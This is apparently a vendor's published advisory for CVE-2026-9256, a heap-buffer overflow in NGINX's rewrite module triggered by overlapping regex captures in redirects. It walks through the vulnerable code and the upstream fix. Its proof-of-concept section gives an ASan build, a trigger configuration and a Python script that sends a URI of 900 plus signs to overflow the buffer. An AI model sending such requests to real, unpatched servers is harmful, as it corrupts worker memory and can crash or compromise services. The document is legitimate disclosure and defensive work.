---
schema_version: "1.0.0"
document_id: "9aaedfa9b6f40bd8a5d1a65543ba4272d23d5982393a88185b8831deef6c0801"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-9256"
published_at: "2026-05-22T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:50:31.360725+00:00"
content_hash: "sha256:894ceba7fe25cf17d498a0b20ea2c718cb05f4b3d9f1b20b83be16ebdbdefe82"
---

# rewrite overlapping captures heap overflow (CVE-2026-9256)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


High


CVE-2026-9256


2026-05-22


# rewrite overlapping captures heap overflow (CVE-2026-9256)


## Summary


NGINX under-sized rewrite redirect buffers when distinct overlapping captures were escaped independently


A regex rewrite such as` rewrite ^/((.*))$ http://127.0.0.1:18081/$1$2 redirect;` can make` $1` and` $2` cover the same attacker-controlled URI bytes. In NGINX 1.31.0 (` e8053c867f9ab14f323e3019ccab585d857abb66` ), the rewrite compiler could discard the capture-aware length bytecode for capture-only replacements because` sc.variables == 0` and` sc.dup_capture == 0` when the replacement references distinct capture numbers.


At runtime,` ngx_http_script_regex_start_code()` then used its` code->lengths == NULL` fast path. Before the fix, that fast path added the replacement's static size, one whole-URI escape adjustment, and the raw length of each capture. That was not equivalent to the copy phase for overlapping captures:` ngx_http_script_copy_capture_code()` escapes every referenced capture independently when the rewrite is in a redirect or arguments context and the request URI contains escapable bytes such as` +` .


The original ASan reproducer on the real HTTP listener showed` ngx_http_script_copy_capture_code()` writing past a 4096-byte request-pool allocation when a path of plus signs was rewritten through` $1$2` . F5 published this as[CVE-2026-9256](https://www.cve.org/CVERecord?id=CVE-2026-9256) , CWE-122, with CVSS 3.1 score 8.1. NGINX fixed it through PR #1395, merged as commit` ca4f92a27464ae6c2082245e4f67048c633aa032` , and the NGINX 1.31.1 changelog credits Mufeed VH of Winfunc Research.


### CVSS Score


Vector


N


Complexity


H


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 408


src /http


/modules


/ngx_http_rewrite_module.c


ngx_http_rewrite() (capture-only replacement selects fast path)


Sink


Line 1400


src /http


/ngx_http_script.c


ngx_http_script_copy_capture_code() (escaped capture copy)


## Source-to-Sink Analysis


1


src/http/modules/ngx_http_rewrite_module.c:408-410 (before fix)


The rewrite compiler removed the exact capture-aware length program when the replacement had no non-capture variables and no duplicate reference to the same capture number. A replacement like` $1$2` with distinct captures satisfied that condition even though both captures could overlap.


CPP


```text
if   (sc.variables ==  0   && !sc.dup_capture) {
regex->lengths =  NULL  ;
}


```


2


src/http/ngx_http_script.c:1143-1155 (before fix)


With` regex->lengths == NULL` , the runtime fast path sized the output buffer by adding one whole-URI escape adjustment and the raw length of each capture. It did not calculate escape expansion per referenced capture.


CPP


```text
if   (code->lengths ==  NULL  ) {
e->buf.len = code->size;


if   (code->uri) {
if   (r->ncaptures && (r->quoted_uri || r->plus_in_uri)) {
e->buf.len +=  2   *  ngx_escape_uri  ( NULL  , r->uri.data, r->uri.len,
NGX_ESCAPE_ARGS);
}
}


for   (n =  2  ; n < r->ncaptures; n +=  2  ) {
e->buf.len += r->captures[n +  1  ] - r->captures[n];
}
}


```


3


src/http/ngx_http_script.c:1179


The under-sized length was used for a request-pool allocation. In the ASan run, the allocation stayed in a 4096-byte pool block and the later escaped copy wrote at the first byte past that block.


CPP


```text
e->buf.data =  ngx_pnalloc  (r->pool, e->buf.len);
if   (e->buf.data ==  NULL  ) {
e->ip = ngx_http_script_exit;
e->status = NGX_HTTP_INTERNAL_SERVER_ERROR;
return  ;
}


e->pos = e->buf.data;


```


4


src/http/ngx_http_parse.c:548-571


A URI containing` +` or quoted bytes sets request parser flags that later make redirect and arguments capture copies use` NGX_ESCAPE_ARGS` escaping.


CPP


```text
case    '+'  :
r->plus_in_uri =  1  ;
break  ;


case    '%'  :
quoted_state = state;
state = sw_quoted;
break  ;


```


5


src/http/ngx_http_script.c:1397-1402


The copy phase escapes each referenced capture independently. For nested captures such as` ^/((.*))$` ,` $1` and` $2` can cover the same bytes, so the same attacker-controlled plus signs are expanded twice even though the vulnerable fast path only reserved one URI-wide escape adjustment.


CPP


```text
if   (e->quote
&& (r->quoted_uri || r->plus_in_uri))
{
p = e->pos;
e->pos = (u_char *)  ngx_escape_uri  (p, &e->line.data[cap[n]],
cap[n +  1  ] - cap[n],
NGX_ESCAPE_ARGS);
}


```


6


src/http/ngx_http_script.c:1145-1163 (fix, commit ca4f92a)


The accepted upstream fix keeps the fast path but makes its sizing mirror the copy phase: each capture contributes its raw length plus its own` NGX_ESCAPE_ARGS` expansion. Distinct overlapping captures are therefore counted separately.


CPP


```text
cap = r->captures;
p = r->captures_data;


for   (n =  2  ; n < r->ncaptures; n +=  2  ) {
e->buf.len += cap[n +  1  ] - cap[n];


if   (code->uri) {
if   (r->quoted_uri || r->plus_in_uri) {
e->buf.len +=  2   *  ngx_escape_uri  ( NULL  , &p[cap[n]],
cap[n +  1  ] - cap[n],
NGX_ESCAPE_ARGS);
}
}
}


```


## Impact Analysis


### Critical Impact


The demonstrated primitive is unauthenticated remote heap memory corruption in an NGINX worker process. The original ASan build aborted with a heap-buffer-overflow at the end of a 4096-byte request-pool allocation. The public CVE record states that exploitation can cause a worker restart and that code execution is possible when ASLR is disabled or bypassed. This entry does not claim a confirmed production RCE chain beyond the proven out-of-bounds write.


### Attack Surface


NGINX Open Source and NGINX Plus configurations using` ngx_http_rewrite_module` with a regex` rewrite` whose replacement references distinct, overlapping PCRE captures in a redirect or arguments context. The NGINX security index lists Open Source versions` 0.1.17-1.31.0` as vulnerable and` 1.31.1+` /` 1.30.2+` as fixed.


### Preconditions


The target must have regex rewrite support enabled and a reachable rewrite rule shaped like` ^/((.*))$` with a replacement such as` $1$2` . The replacement must take the capture-only fast path, and the attacker must send a matching URI containing bytes that require arguments escaping, such as` +` .


## Proof of Concept


### Environment Setup


Build the affected NGINX Open Source 1.31.0 release with ASan from the source root:


BASH


```text
git  clone   https://github.com/nginx/nginx.git
cd   nginx
git checkout e8053c867f9ab14f323e3019ccab585d857abb66


auto/configure \
--with-debug \
--with-cc-opt= '-fsanitize=address -fno-omit-frame-pointer -g'   \
--with-ld-opt= '-fsanitize=address'
make -j " $(getconf _NPROCESSORS_ONLN 2>/dev/null || sysctl -n hw.ncpu)  "


```


### Target Configuration


Run a single-process listener with a nested capture redirect rewrite:


NGINX


```text
daemon off;
master_process off;
worker_processes 1;
error_log logs/error-overlap.log debug;
pid logs/nginx-overlap.pid;


events {
worker_connections 1024;
}


http {
server {
listen 127.0.0.1:18081;


location / {
rewrite ^/((.*))$ http://127.0.0.1:18081/$1$2 redirect;
}
}
}


```


### Exploit Delivery


Start nginx with ASan enabled and send a URI containing escapable plus signs:


BASH


```text
ASAN_OPTIONS= 'detect_leaks=0:halt_on_error=1:abort_on_error=1'   \
./objs/nginx -p  " $PWD  "   -c conf/poc-overlap.conf \
>logs/stdout-overlap.log 2>logs/stderr-overlap.log &


python3 - << 'PY'
import socket
import  time


host =  "127.0.0.1"
port = 18081


for   _  in   range(100):
try:
with socket.create_connection((host, port), timeout= 0.1  ):
break
except OSError:
time.sleep( 0.05  )
else:
raise SystemExit("nginx did not start")


request = (
b"GET /" + (b"+" *  900  ) + b" HTTP/ 1.1  \r\n"
b"Host:  127.0  . 0.1  \r\n"
b"Connection: close\r\n"
b"\r\n"
)


with socket.create_connection((host, port), timeout= 2  ) as sock:
sock.sendall(request)
try:
sock.recv( 4096  )
except OSError:
pass
PY


```


### Outcome


The crafted request causes redirect construction to overflow the under-sized request-pool buffer. After applying PR #1395 / commit` ca4f92a27464ae6c2082245e4f67048c633aa032` , the same request should not produce an ASan heap-buffer-overflow and the worker should continue serving requests.


**Expected Response:** A vulnerable ASan build reports a heap-buffer-overflow in` ngx_http_script_copy_capture_code` , with allocation from` ngx_http_script_regex_start_code` and a write at the end of a 4096-byte region:


TEXT


```text
AddressSanitizer: heap-buffer-overflow
WRITE of size 1
ngx_http_script_copy_capture_code
ngx_http_script_regex_start_code
0 bytes after 4096-byte region


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/pull/1395)
